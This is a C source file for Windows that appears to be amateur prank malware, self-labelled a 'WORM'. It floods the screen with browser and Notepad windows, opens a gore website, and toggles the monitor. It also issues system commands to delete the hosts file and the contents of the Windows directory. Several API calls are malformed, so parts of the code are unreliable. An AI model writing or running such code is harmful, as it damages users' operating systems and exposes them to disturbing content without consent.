
#include <windows.h>
#include <stdatomic.h>
// #include <avx512ifmavlintrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>

void fun3(int n)
{
    if (n <=INT_MIN) // set with a minimum integer value 
    {
        return;
    }
    ShellExecute(NULL,NULL,"close","Visual Studio Code",NULL,SW_MAX); // closed vscode 
    MessageBox(NULL, "0XDEF", "CAUTION!!", MB_ABORTRETRYIGNORE);// dispaly message pooped up with the following dialogues
    ShellExecuteW(NULL,"open"," msedge.exe",NULL,NULL,SW_MAX);// open edge 
    ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);// open notepad process continues.....
    
    ShellExecute(NULL,NULL,"close","Visual Studio Code",NULL,SW_MINIMIZE);// close 
    Beep(1000,500);  // Changed to MB_ICONINFORMATION for a standard beep sound
    Beep(6000,500);
    fun3(n - 1);
    
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)
{
    // main function entry point 
    MessageBox(NULL, "hello, world", "caption", MB_ICONINFORMATION | MB_OK);  // Combined flags for MessageBox



    FILE* fp = fopen("NewFile.txt", "w");  // Changed file name to avoid system errors
    if (fp != NULL) {
        char str[] = "CALL-OF-DUTY-TUF-GUY WORM";
        fputs(str, fp);
        fclose(fp);
    }


      //Openning stuffs and closing stuffs 
      ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
       MessageBeep(MB_ICONINFORMATION);
       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://safeweb.norton.com/404",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe","https://goregrish.com",NULL,SW_SHOWMAXIMIZED);
        ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);

                ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
       MessageBeep(MB_ICONINFORMATION);
       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
       system("del C:\WINDOWS\System32\drivers\etc\hosts");// deleting the host files of C directory in sense of malfunction 
    system("del C:\\WINDOWS\\.");//Now fire up the C drive  



       SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);// off the computer 
       Sleep(10000);// put the pc in in sleep for 10000 ms  
       SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)-1); // on the goddamn pc again 
       MessageBeep(MB_CANCELTRYCONTINUE);// let's beep the system 
        MessageBeep(MB_CANCELTRYCONTINUE);
         MessageBeep(MB_CANCELTRYCONTINUE);


     
    int n = 10;  
    fun3(n);

    return 0;
}



